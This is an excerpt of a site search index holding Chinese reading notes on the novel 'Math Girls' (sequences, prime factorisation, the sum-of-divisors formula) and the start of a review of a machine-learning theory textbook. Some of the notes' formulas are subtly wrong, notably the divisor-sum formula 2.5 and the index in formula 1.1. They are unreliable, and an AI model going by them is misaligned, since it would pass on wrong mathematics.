\u6570\u5217\u548c\u6570\u5b66\u6a21\u578b"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#21","text":"\u672c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u7537\u4e3b\u548c\u7c73\u5c14\u5609\u7684\u76f8\u9047\u8fc7\u7a0b\uff0c\u7c73\u5c14\u5609\u7ed9\u7537\u4e3b\u5ff5\u4e86\u51e0\u4e2a\u6570\u5217\uff0c\u88ab\u7537\u4e3b\u63a5\u4e0a\u4e86\uff0c\u4e24\u4eba\u5c31\u50cf\u5bf9\u4e0a\u4e86\u6697\u53f7\uff0c\u786e\u8ba4\u8fc7\u773c\u795e\uff0c\u90fd\u662f\u641e\u6570\u5b66\u7684\u4eba\u3002","title":"2.1. \u6545\u4e8b\u60c5\u8282"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#22","text":"\u6570\u5217\u9898\u63d0\u4f9b\u7684\u6709\u9650\u7684\u51e0\u4e2a\u6570\u5b57\uff0c\u800c\u6570\u5217\u672c\u8eab\u662f\u65e0\u9650\u5ef6\u7eed\u7684\uff0c\u5c31\u50cf\u770b\u8d77\u6765\u5f88\u7b80\u5355\u7684 1, 2, 3, 4 ,\\cdots \u8fd9\u6837\u7684\u6570\u5217\uff0c\u6211\u4eec\u5f88\u81ea\u7136\u5730\u4f1a\u60f3\u5230\u4e0b\u4e00\u4e2a\u6570\u5e94\u8be5\u662f 5 \uff0c\u4f46\u5176\u5b9e\u540e\u9762\u7684\u6570\u4e5f\u53ef\u4ee5\u662f 10, 20, 30, 40,\\cdots \u6ee1\u8db3\u4e0b\u9762\u7684\u8868\u8fbe\u5f0f a_n = [((x-1) \\mod 4 ) + 1] * 10^{\\lfloor(x / 4) \\rfloor} , (n \\in N_+) \\tag{1.1} \u6211\u4eec\u65e0\u6cd5\u53d1\u73b0\u6570\u5217\u7684\u89c4\u5f8b\uff0c\u771f\u6b63\u7684\u6570\u5217\u6a21\u578b\u662f\u4e00\u773c\u770b\u4e0d\u51fa\u6765\u7684\u3002\u5982\u4e0b\u9762\u8fd9\u4e2a\u6570\u5217 1, 2, 3, 4, 6, 9, 8, 12, 18, 27, \\cdots \u5176\u7b54\u6848\u53ef\u80fd\u662f\u8fd9\u6837\u7684 {\\underbrace{2^0 3^0}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a0}}}, {\\underbrace{2^1 3^0, 2^0 3^1}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a1}}} , {\\underbrace{2^2 3^0, 2^1 3^1, 2^0 3^2}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a2}}} , {\\underbrace{2^3 3^0, 2^2 3^1, 2^1 3^2, 2^0 3^3}_{\\text{\u6307\u6570\u4e4b\u548c\u4e3a3}}} , \\cdots \u8fd9\u5c31\u5f15\u51fa\u4e86\u540e\u9762\u7684 \u8d28\u6570\u5206\u89e3 \u95ee\u9898\uff0c\u5373\u4e66\u4e2d\u6240\u8bf4\u7684\u201c\u4e16\u754c\u4e0a\u53ea\u6709\u4e24\u4e2a\u8d28\u6570\u201d\u7684\u8bdd\u9898\u3002","title":"2.2. \u6570\u5217\u667a\u529b\u9898\u6ca1\u6709\u6b63\u786e\u7b54\u6848"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#3-2","text":"","title":"3. \u7b2c2\u7ae0 \u4e00\u5c01\u540d\u53eb\u6570\u5b66\u516c\u5f0f\u7684\u60c5\u4e66"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#31","text":"\u8fd9\u4e00\u7ae0\u4e3b\u8981\u8bb2\u8ff0\u4e86\u7537\u4e3b\u548c\u6cf0\u6735\u62c9\u7684\u76f8\u9047\u8fc7\u7a0b\u3002\u7537\u4e3b\u6536\u5230\u4e00\u5c01\u6765\u81ea\u6cf0\u6735\u62c9\u7684\u4fe1\uff0c\u4fe1\u4e2d\u8bf4\u5230\u6cf0\u6735\u62c9\u5e0c\u671b\u7537\u4e3b\u80fd\u591f\u6559\u5979\u5982\u4f55\u5b66\u597d\u6570\u5b66\uff0c\u4e8e\u662f\u4e24\u4eba\u76f8\u7ea6\u5728\u9636\u68af\u6559\u5ba4\u3002","title":"3.1. \u6545\u4e8b\u60c5\u8282"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#32","text":"\u7c73\u5c14\u5609\u7ed9\u7537\u4e3b\u51fa\u4e86\u4e00\u9053\u9898\uff0c\u9898\u76ee\u5982\u4e0b \u6709\u4e00\u4e2a\u6b63\u6574\u6570 n \u5982\u4f55\u6c42\u51fa n \u7684\u6240\u6709\u7ea6\u6570\u4e4b\u548c\uff1f \u7b26\u53f7\u5b9a\u4e49 \uff1a \u7528 p_0, p_1, p_2, \\dots, p_m \u6765\u8868\u793a\u8d28\u6570 \u7528 a_0, a_1, a_2 \\dots, a_m \u6765\u8868\u793a\u6307\u6570 m + 1 \u8868\u793a\u5c06 n \u5206\u89e3\u8d28\u56e0\u6570\u540e\u8d28\u56e0\u6570\u7684\u4e2a\u6570 \u7537\u4e3b\u7684\u89e3\u6cd5 \uff1a \u5c06\u6b63\u6574\u6570 n \u8fdb\u884c\u56e0\u5f0f\u5206\u89e3 \u5047\u8bbe p_0, p_1, p_2, \\dots, p_m \u4e3a\u8d28\u6570\uff0c a_0, a_1, a_2 \\dots, a_m \u4e3a\u6b63\u6574\u6570\uff0c\u5219\u6709 n = p_0^{a_0} \\times p_1^{a_1} \\times p_2^{a_2} \\times \\dots \\times p_m^{a_m} \\tag{2.1} n \u7684\u7ea6\u6570 T_n \u5c31\u53ef\u4ee5\u8868\u73b0\u4e3a\u4ee5\u4e0b\u5f62\u5f0f\u3002 T_n = p_0^{b_0} \\times p_1^{b_1} \\times p_2^{b_2} \\times \\dots \\times p_m^{b_m} \\tag{2.2} \u5176\u4e2d b_m \u5c31\u662f\u4ee5\u4e0b\u6574\u6570\u3002 b_0 = 0, 1, 2,3, \\dots , a_0 \\text{\u4e2d\u7684\u4efb\u610f\u6570} b_1 = 0, 1, 2,3, \\dots , a_1 \\text{\u4e2d\u7684\u4efb\u610f\u6570} b_m = 0, 1, 2,3, \\dots , a_m \\text{\u4e2d\u7684\u4efb\u610f\u6570} \u5c06\u516c\u5f0f 2.2 \u5c55\u5f00\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u516c\u5f0f 2.3 \u3002 { \\begin{aligned} T_n &= (1 + p_0 + p_0^2 + \\dots + p_0^{a_0}) & \\\\ &\\times (1 + p_1 + p_1^2 + \\dots + p_1^{a_1}) &\\\\ &\\times (1 + p_2 + p_2^2 + \\dots + p_2^{a_2}) &\\\\ &\\times \\dots &\\\\ &\\times (1 + p_m + p_m^2 + \\dots + p_m^{a_m}) &\\\\ \\end{aligned} } \\tag{2.3} \u8fd9\u4e2a\u516c\u5f0f\u663e\u7136\u5f88\u4e0d\u7b80\u6d01\uff0c\u4e0b\u9762\u770b\u7c73\u5c14\u5609\u7684\u89e3\u7b54\u3002 \u7c73\u5c14\u5609\u7684\u89e3\u6cd5 \uff1a \u5c06\u5927\u4e8e1\u7684\u6574\u6570 n \u8fdb\u884c\u4ee5\u4e0b\u5f62\u5f0f\u7684\u8d28\u56e0\u6570\u5206\u89e3 n = \\prod_{k = 0}^m p_k^{a_k} \\tag{2.4} \u5047\u8bbe p_k \u4e3a\u4e92\u4e0d\u76f8\u540c\u7684\u8d28\u6570\uff0c a_k \u4e3a\u6b63\u6574\u6570\u3002\u90a3\u4e48\uff0c\u6b64\u65f6 n \u7684\u6240\u6709\u7ea6\u6570\u4e4b\u548c T_n \u5c31\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u6765\u6c42\u89e3\u3002 { \\begin{aligned} T_n & = \\prod_{k = 0}^m \\sum_{i = 0}^m p_k^{a_i} & \\\\ & = \\prod_{k = 0}^m \\frac{1 - p_k^{a_k + 1}}{1 - p_k} & \\\\ \\tag{2.5} \\end{aligned} }","title":"3.2. \u6240\u6709\u7ea6\u6570\u4e4b\u548c"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#4-3-omega","text":"","title":"4. \u7b2c3\u7ae0 \\omega\u7684\u534e\u5c14\u5179"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#5-4","text":"","title":"5. \u7b2c4\u7ae0 \u6590\u6ce2\u90a3\u5951\u6570\u5217\u548c\u751f\u6210\u51fd\u6570"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#6-5","text":"","title":"6. \u7b2c5\u7ae0 \u57fa\u672c\u4e0d\u7b49\u5f0f"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#7-6","text":"","title":"7. \u7b2c6\u7ae0 \u5728\u7c73\u5c14\u5609\u65c1\u8fb9"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#8-7","text":"","title":"8. \u7b2c7\u7ae0 \u5377\u79ef"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#9-8","text":"","title":"9. \u7b2c8\u7ae0 \u8c03\u548c\u6570"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#10-9","text":"","title":"10. \u7b2c9\u7ae0 \u6cf0\u52d2\u5c55\u5f00\u548c\u5df4\u585e\u5c14\u95ee\u9898"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#11-10","text":"","title":"11. \u7b2c10\u7ae0 \u5206\u62c6\u6570"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#12_1","text":"","title":"12. \u603b\u7ed3"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#121","text":"","title":"12.1. \u539f\u4e66\u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%A6/1.%E6%95%B0%E5%AD%A6%E5%A5%B3%E5%AD%A9/#122","text":"[1] \u5f97\u5230APP.\u300a\u6570\u5b66\u5973\u5b69\u300b[EB/OL].https://m.igetget.com/hybrid/v2/ebook/detail?bid=qPKdG1m9B8MaveyJdxRzNnKYlqgVZ3koXB3o5pL7E4m1r26kQjXDAPObGkYgJ4pN,2016.01. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"12.2. \u672c\u6587\u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/1.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E5%AF%BC%E5%BC%95/","text":"\u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 # \u76ee\u5f55 # \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 3. \u7b2c\u4e00\u7ae0 \u9884\u5907\u77e5\u8bc6 3.1. \u51fd\u6570\u7684\u51f9\u51f8\u6027 3.2. \u5b66\u4e60\u7406\u8bba\u7684\u4f5c\u7528 4. \u53ef\u5b66\u6027 4.1. \u57fa\u672c\u6982\u5ff5 4.1.1. \u72ec\u7acb\u540c\u5206\u5e03 4.1.2. \u6cdb\u5316\u8bef\u5dee 4.1.3. \u7ecf\u9a8c\u8bef\u5dee 4.1.4. \u8bef\u5dee\u53c2\u6570 4.1.5. \u4e0d\u5408 4.1.6. \u6982\u5ff5\u4e0e\u6982\u5ff5\u7c7b 4.1.7. \u5047\u8bbe\u7a7a\u95f4 4.1.8. \u53ef\u5206\u4e0e\u4e0d\u53ef\u5206 4.2. PAC\u5b66\u4e60 4.3. \u5206\u6790\u5b9e\u4f8b 1. \u80cc\u666f # \u6700\u8fd1\u770b\u5230\u4e86\u5468\u5fd7\u534e\u8001\u5e08\u51fa\u4e86\u65b0\u4e66\u300a\u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15\u300b\uff0c\u6211\u62b1\u7740\u4e0d\u80fd\u9519\u8fc7\u7684\u5fc3\u6001\u4e70\u6765\u770b\u4e86\u4e00\u770b\uff0c\u53d1\u73b0\u65b0\u4e66\u4e0e\u4ee5\u524d\u770b\u8fc7\u7684\u673a\u5668\u5b66\u4e60\u65b9\u9762\u7684\u4e66\u6240\u8bb2\u8ff0\u7684\u5185\u5bb9\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u4e8e\u662f\u60f3\u5199\u4e00\u7bc7\u7b14\u8bb0\u8bb0\u5f55\u4e00\u4e0b\u3002 2. \u6982\u8ff0 # \u8fd9\u662f\u4e00\u672c\u8ba9\u4eba\u81ea\u7701\u5e76\u4e14\u53d1\u73b0\u81ea\u5df1\u7684\u65e0\u77e5\u7684\u4e66\u3002 \u6211\u5927\u6982\u662f\u4e00\u5e74\u524d\u5f00\u59cb\u4e86\u89e3\u673a\u5668\u5b66\u4e60\u7684\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2a \u4e0d\u5b66AI\uff0c\u65e0\u4ee5\u8a00 \u7684\u65f6\u5019\u3002\u5468\u5fd7\u534e\u8001\u5e08\u7684\u300a \u673a\u5668\u5b66\u4e60 \u300b\uff0c\u674e\u822a\u8001\u5e08\u7684\u300a \u7edf\u8ba1\u5b66\u4e60\u65b9\u6cd5 \u300b\uff0c\u62ff\u5728\u624b\u4e0a\u597d\u50cf\u8d70\u8def\u5e26\u98ce\uff0c\u6709\u4e86\u8fd9\u4e24\u672c\u4e66\uff0c\u597d\u50cf\u5c31\u628a\u81ea\u5df1\u548c\u7199\u7199\u6518\u6518\u7684\u4eba\u7fa4\u533a\u5206\u4e86\u5f00\u6765\uff0c\u6211\u4eec\u662f \u77e5\u9053AI\u7684\u4eba \uff0c\u4ed6\u4eec\u662f \u4e0d\u77e5\u9053AI\u7684\u4eba \u3002 \u6211\u5728\u6dd8\u5b9d\u641c\u4e86\u4e00\u4e0b\uff0c\u300a \u6df1\u5ea6\u5b66\u4e60 \u300b\u6ca1\u6709\u4e0a\u9762\u4e24\u672c\u4e66\u5356\u5f97\u597d\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u4e3b\u8981\u662f\u592a\u91cd\u4e86\u4e0d\u597d\u5e26\u7740\u51fa\u95e8\u3002 \u521a\u5f00\u59cb\u5b66\u7684\u65f6\u5019\uff0c sklearn \u4e00\u8c03\uff0c\u4e24\u624b\u4e00\u53c9\uff0c\u518d\u559d\u53e3\u8336\uff0c\u770b\u7740\u5c4f\u5e55\u4e0a\u8f93\u51fa\u7684 loss \u9010\u6e10\u964d\u4f4e\uff0c\u611f\u89c9\u81ea\u5df1\u5c31\u662f AI \u7684 Master \u3002 \u540e\u6765\u9646\u9646\u7eed\u7eed\u770b\u4e86\u4e00\u70b9 CV \u3001 NLP \u3001 GAN \u3001 \u77e5\u8bc6\u56fe\u8c31 \uff0c\u867d\u7136\u516c\u5f0f\u5f88\u591a\u770b\u4e0d\u61c2\uff0c\u4f46\u8bb8\u591a\u65f6\u5019\u4e5f\u5c31\u662f\u8fd9\u6837\u7684 \u7f51\u7edc \u548c\u90a3\u6837\u7684 \u5377\u79ef \u7684\u4e00\u4e9b\u7ec4\u5408\u3002\u518d\u52a0\u4e0a\u53ef\u4ee5 import tensorflow as tf \uff0c from torch import nn \uff0c import mxnet as mx \uff0c\u54ea\u91cc\u4e0d\u4f1a\u70b9\u54ea\u91cc\uff0c\u60f3\u8981\u4ec0\u4e48\u7f51\u7edc\u90fd\u6709\u73b0\u6210\u7684\u3002 \u4e8e\u662f\uff0c AI \u5de5\u5177\u7684\u4f4e\u4f7f\u7528\u95e8\u69db\u548c AI \u5c97\u4f4d\u7684\u9ad8\u6536\u76ca\u5f62\u6210\u4e86\u9c9c\u660e\u7684\u5bf9\u6bd4\uff0c\u8fd9\u5c31\u662f\u91d1\u878d\u754c\u82e6\u82e6\u8ffd\u5bfb\u7684 \u65e0\u98ce\u9669\u5957\u5229 \u554a\u3002\u4e00\u65f6\u95f4\u641e\u751f\u7269\u7684\u3001\u641e\u673a\u68b0\u7684\u3001\u641e\u901a\u8baf\u7684\u90fd\u5f00\u59cb\u5b66\u8d77\u4e86 AI \uff0c\u5176\u4e2d\u5f53\u7136\u5c11\u4e0d\u4e86\u6211\u4eec\u641e\u8ba1\u7b97\u673a\u7684\uff0c\u5b57\u8282\u8df3\u52a8\u751a\u81f3\u56e0\u4e3a \u6536\u5230\u7684\u7b97\u6cd5\u5de5\u7a0b\u5e08\u7b80\u5386\u7684\u6570\u91cf\u8fdc\u8d85\u9700\u6c42 \uff0c\u7ed9\u6c42\u804c\u8005\u53d1\u90ae\u4ef6\u5efa\u8bae\u5927\u5bb6\u8f6c\u6295\u5f00\u53d1\u5c97\u4f4d\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u4e5f\u5b66\u4f1a\u4e86\u4e00\u4e2a\u540d\u8bcd\u53eb \u4eba\u624d\u5185\u5377 \u3002 \u8d28\u7591\u7684\u58f0\u97f3\u4e5f\u603b\u4f1a\u6709\u7684\uff0c\u4e00\u4e2a\u8dd1\u51fa\u6765\u7684\u7ed3\u679c\u597d\uff0c\u4f46\u662f\u4f60\u6839\u672c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u597d\u7684\u6a21\u578b\uff0c\u771f\u7684\u4f1a\u6709\u4e0d\u9519\u7684\u5e94\u7528\u524d\u666f\u5417\uff1f \u5728\u8fd9\u6837\u7684\u73af\u5883\u4e0b\uff0c\u6f5c\u5fc3\u641e\u7406\u8bba\u7814\u7a76\u7684\u4eba\u5c11\uff0c\u8d76\u7d27\u8c03\u4e2a\u53c2\u53d1\u4e24\u7bc7\u8bba\u6587\u7684\u4eba\u591a\u3002 \u6211\u5b66\u5f97\u4e5f\u5f88\u6d6e\u8e81\uff0c\u56e0\u4e3a\u522b\u4eba\u5728\u5ba3\u626c AI \u4f1a\u63a8\u7ffb\u4eba\u7c7b\u5bf9\u4e16\u754c\u7684\u7edf\u6cbb\u7684\u65f6\u5019\uff0c\u6211\u9ed8\u9ed8\u5730\u770b\u4e86\u4e00\u773c\u5c4f\u5e55\u4e2d\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u4f4e\u4e0b\u4e86\u81ea\u5df1\u7684\u5934\u3002 \u4ece\u4eac\u4e1c\u5c0f\u54e5\u624b\u91cc\u62ff\u8fc7\u4e66\u7684\u65f6\u5019\uff0c\u6211\u6382\u91cf\u4e86\u4e00\u4e0b\uff0c\u4e0d\u91cd\uff0c\u9002\u5408\u5e26\u51fa\u95e8\u3002\u62c6\u6389\u5916\u5305\u88c5\u4e4b\u540e\uff0c\u53d1\u73b0\u9875\u9762\u6709\u4e00\u70b9\u8936\u76b1\uff0c\u4e0d\u8981\u7d27\uff0c\u518d\u8fc7\u4e00\u5e74\u53ef\u80fd\u5c31\u770b\u8d77\u6765\u8ddf\u65b0\u4e70\u7684\u4e00\u6837\u4e86\u3002 \u770b\u4e66\u5148\u770b\u76ee\u5f55\uff0c\u53ef\u662f\u4e00\u770b\u76ee\u5f55\u6211\u5c31\u50bb\u4e86\uff0c\u9884\u60f3\u4e4b\u4e2d\u7684\u719f\u6089\u611f\u6ca1\u6709\u5230\u6765\uff0c\u5f88\u591a\u4e1c\u897f\u89c1\u90fd\u6ca1\u89c1\u8fc7\u3002 \u6211\u4eec\u6765\u770b\u770b\u300a \u673a\u5668\u5b66\u4e60 \u300b\u7684\u76ee\u5f55\u3002 \u251c\u2500\u2500 \u7b2c1\u7ae0 \u7eea\u8bba \u251c\u2500\u2500 \u7b2c2\u7ae0 \u6a21\u578b\u8bc4\u4f30\u4e0e\u9009\u62e9 \u251c\u2500\u2500 \u7b2c3\u7ae0 \u7ebf\u6027\u6a21\u578b \u251c\u2500\u2500 \u7b2c4\u7ae0 \u51b3\u7b56\u6811 \u251c\u2500\u2500 \u7b2c5\u7ae0 \u795e\u7ecf\u7f51\u7edc \u251c\u2500\u2500 \u7b2c6\u7ae0 \u652f\u6301\u5411\u91cf\u673a \u2514\u2500\u2500 ... \u662f\u4e0d\u662f\u89c9\u5f97\u90fd\u6bd4\u8f83\u719f\u6089\uff0c\u8d77\u7801\u6709\u4e2a\u5927\u6982\u7684 idea \uff0c\u77e5\u9053\u8fd9\u4e9b\u662f\u4ec0\u4e48\u4e1c\u897f\u3002 \u518d\u6765\u770b\u770b\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u7684\u76ee\u5f55\u3002 \u251c\u2500\u2500 \u7b2c1\u7ae0 \u9884\u5907\u77e5\u8bc6 \u251c\u2500\u2500 \u7b2c2\u7ae0 \u53ef\u5b66\u6027 \u251c\u2500\u2500 \u7b2c3\u7ae0 \u590d\u6742\u5ea6 \u251c\u2500\u2500 \u7b2c4\u7ae0 \u6cdb\u5316\u754c \u251c\u2500\u2500 \u7b2c5\u7ae0 \u7a33\u5b9a\u6027 \u251c\u2500\u2500 \u7b2c6\u7ae0 \u4e00\u81f4\u6027 \u251c\u2500\u2500 \u7b2c7\u7ae0 \u6536\u655b\u7387 \u2514\u2500\u2500 \u7b2c8\u7ae0 \u9057\u61be\u754c \u963fSir\uff0c\u8fd9\u4e9b\u90fd\u662f\u5565\u5440\u3002\u4ec0\u4e48\u662f PAC\u53ef\u5b66 \u3001 VC\u7ef4 \u3001 Natarajan\u7ef4 \u3001 \u7ebf\u6027\u8d85\u5e73\u9762 \u3001 \u5728\u7ebf\u5f3a\u51f8\u4f18\u5316 \uff1f \u6211\u518d\u7ffb\u5230\u5e8f\u8a00\u90e8\u5206\uff0c\u8001\u5e08\u4ece2017\u5e74\u5f00\u59cb\u8bd5\u8bb2\u672c\u4e66\uff0c\u671f\u95f4\u591a\u6b21\u8c03\u6574\u5185\u5bb9\uff0c\u57282018\u5e74\u7ed9\u5357\u4eac\u5927\u5b66\u7814\u7a76\u751f\u8bb2\u5b8c\u4e00\u8f6e\u540e\uff0c\u6709 1/3 \u7684\u5b66\u751f\u611f\u89c9\u96be\u5ea6\u8f83\u5927\u3002\u518d\u6b21\u8c03\u6574\u5185\u5bb9\u540e\uff0c\u57282019\u5e74\u6625\u5b63\u53c8\u8bb2\u6388\u4e00\u8f6e\uff0c\u5b66\u751f\u53cd\u9988\u60c5\u51b5\u5927\u81f4\u7b26\u5408\u9884\u671f\u3002 \u6211\u4eec\u53ef\u4ee5\u518d\u62ff\u5468\u5fd7\u534e\u8001\u5e08\u4e4b\u524d\u7684\u4f5c\u54c1\u6765\u8fdb\u884c\u5bf9\u6bd4\u3002\u5728\u300a\u673a\u5668\u5b66\u4e60\u300b\u4e00\u4e66\u4e2d\uff0c\u5468\u5fd7\u534e\u8001\u5e08\u63d0\u5230\u8fd9\u662f\u4e00\u672c \u9762\u5411\u7406\u5de5\u79d1\u9ad8\u5e74\u7ea7\u672c\u79d1\u751f\u548c\u7814\u7a76\u751f\u7684\u6559\u79d1\u4e66 \uff0c\u5e76\u4e14\u7ed9\u51fa\u4e86\u5982\u679c\u4f5c\u4e3a\u672c\u79d1\u751f\u6559\u6750\uff0c\u8bb2\u6388\u8fdb\u5ea6\u4e0a\u7684\u4e00\u4e9b\u5efa\u8bae\u3002 \u800c\u5728\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u4e2d\uff0c\u8001\u5e08\u8bf4\uff0c\u672c\u4e66\u8bfb\u8005\u5fc5\u987b\u5177\u5907 \u8f83\u4e3a\u624e\u5b9e\u7684\u7406\u5de5\u79d1\u9ad8\u5e74\u7ea7\u672c\u79d1\u751f\u7684\u6570\u5b66\u77e5\u8bc6 \uff0c\u8fd8 \u5fc5\u987b\u5177\u5907\u673a\u5668\u5b66\u4e60\u7684\u57fa\u7840\u77e5\u8bc6 \uff0c\u81f3\u5c11\u5e94\u8be5\u7cfb\u7edf\u6027\u5730\u5b66\u4e60\u8fc7\u673a\u5668\u5b66\u4e60\u7684\u4e13\u95e8\u6027\u6559\u79d1\u4e66\u3002 \u7531\u6b64\u6211\u4eec\u5927\u6982\u53ef\u4ee5\u8ba4\u4e3a\uff0c\u300a \u673a\u5668\u5b66\u4e60\u7406\u8bba\u5bfc\u5f15 \u300b\u662f\u300a \u673a\u5668\u5b66\u4e60 \u300b\u4e00\u4e66\u7684\u540e\u7eed\u8fdb\u9636\u8bfb\u7269\uff0c\u6d89\u53ca\u7406\u8bba\u7814\u7a76\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u4e3b\u8981\u9762\u5411\u7684\u7fa4\u4f53\u5e94\u8be5\u8fd8\u662f\u7814\u7a76\u751f\u3002 \u5bf9\u4e8e\u6211\u8fd9\u4e2a\u521a\u63a5\u89e6\u673a\u5668\u5b66\u4e60\u4e00\u5e74\u7684\u666e\u901a\u672c\u79d1\u751f\u6765\u8bf4\uff0c\u91cc\u9762\u662f\u5168\u65b0\u7684\u5185\u5bb9\uff0c\u7c97\u770b\u4e0b\u6765\u66f4\u50cf\u662f\u4e00\u672c\u6570\u5b66\u548c\u7edf\u8ba1\u65b9\u9762\u7684\u4e66\uff0c\u540c\u65f6\u4e5f\u610f\u5473\u7740\u6211\u6709\u4e0d\u5c11\u7684\u6570\u5b66\u77e5\u8bc6\u9700\u8981\u8865\u5145\u3002 \u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u5728\u4e00\u5f00\u59cb\u8bf4\u5230\uff0c\u8fd9\u662f\u4e00\u672c\u8ba9\u4eba\u81ea\u7701\u5e76\u4e14\u53d1\u73b0\u81ea\u5df1\u7684\u65e0\u77e5\u7684\u4e66\u3002 \u6709\u4e86\u9ed1\u7bb1\u5de5\u5177\u7684\u652f\u6301\uff0c\u6211\u4eec\u7ad9\u5728\u5e94\u7528\u7684\u5c42\u9762\u4e0a\uff0c\u5f88\u5bb9\u6613\u89c9\u5f97\u673a\u5668\u5b66\u4e60\u4e0d\u8fc7\u5982\u6b64\uff0c\u4f46\u662f\u673a\u5668\u5b66\u4e60\u771f\u7684\u4e0d\u8fc7\u5982\u6b64\u5417\uff1f\u6709\u65f6\u5019\uff0c\u6211\u4eec\u4ea7\u751f \u4e0d\u8fc7\u5982\u6b64 \u7684\u611f\u89c9\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u7684\u4e1c\u897f\u592a\u5c11\u3002 \u6709\u4e00\u79cd\u8ba4\u77e5\u504f\u5dee\u53eb\u505a \u8fbe\u514b\u6548\u5e94\uff08D-K effect\uff09 \uff0c\u5168\u79f0\u4e3a \u9093\u5b81-\u514b\u9c81\u683c\u6548\u5e94\uff08Dunning-Kruger effect\uff09 \u3002\u80fd\u529b\u6b20\u7f3a\u8005\u4eec\u6c89\u6d78\u5728\u81ea\u6211\u8425\u9020\u7684\u865a\u5e7b\u7684\u4f18\u52bf\u4e4b\u4e2d\uff0c\u5e38\u5e38\u9ad8\u4f30\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\u3002 \u8fd9\u672c\u4e66\u4e5f\u8bb8\u5c31\u80fd\u8ba9\u4eba\u4ece\u611a\u6627\u5c71\u5cf0\u4e0a\u8d70\u4e0b\u6765\uff0c\u610f\u8bc6\u5230\u81ea\u5df1\u7684\u65e0\u77e5\u3002 \u5982\u679c\u8bf4\u300a \u673a\u5668\u5b66\u4e60 \u300b\u4e0e\u8bb2 TensorFlow 